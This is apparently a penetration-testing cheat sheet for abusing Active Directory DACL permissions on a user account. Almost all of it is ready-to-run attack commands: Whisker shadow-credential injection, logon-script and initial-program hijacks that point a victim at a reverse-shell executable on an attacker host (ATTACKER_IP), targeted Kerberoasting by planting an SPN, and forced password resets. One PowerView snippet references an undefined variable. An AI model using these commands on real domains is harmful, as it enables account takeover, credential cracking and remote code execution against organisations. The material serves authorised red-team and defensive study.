# DACL Attacks on a user

## 1) WriteProperty

### ShadowCredentials

    Whisker.exe add /target:<target> /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:"Password123!"

### Logon Script

##### PowerView

    Set-DomainObject <target> -Set @{'mstsinitialprogram'='\\ATTACKER_IP\rev.exe'} -Verbose

##### AD module

    Set-ADObject -SamAccountName '<target>' -PropertyName scriptpath -PropertyValue "\\ATTACKER_IP\rev.exe"

### Targeted Kerberoasting

We can then request a ST without special privileges. The ST can then be "Kerberoasted".

##### Verify if the user already has a SPN

    Get-DomainUser -Identity <target> | select serviceprincipalname

##### Using ActiveDirectory module

    Get-ADUser -Identity <target> -Properties ServicePrincipalName | select ServicePrincipalName

#### TIP: New SPN must be unique in the domain

##### Set the SPN

    Set-DomainObject -Identity user -Set @{serviceprincipalname='ops/whatever1'}

##### Using ActiveDirectory module

    Set-ADUser -Identity user -ServicePrincipalNames @{Add='ops/whatever1'} 

##### Request the ticket
    
    Add-Type -AssemblyNAme System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
    
##### From PowerView

    Request-SPNTicket

## 2) User-Force-Change-Password

With enough permissions on a user, we can change his password

    net user <target> Password123! /domain

##### With PowerView

    $pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("domain\user1", $pass)
    Set-DomainUserPassword "<target>" -AccountPassword $UserPassword -Credential $cred

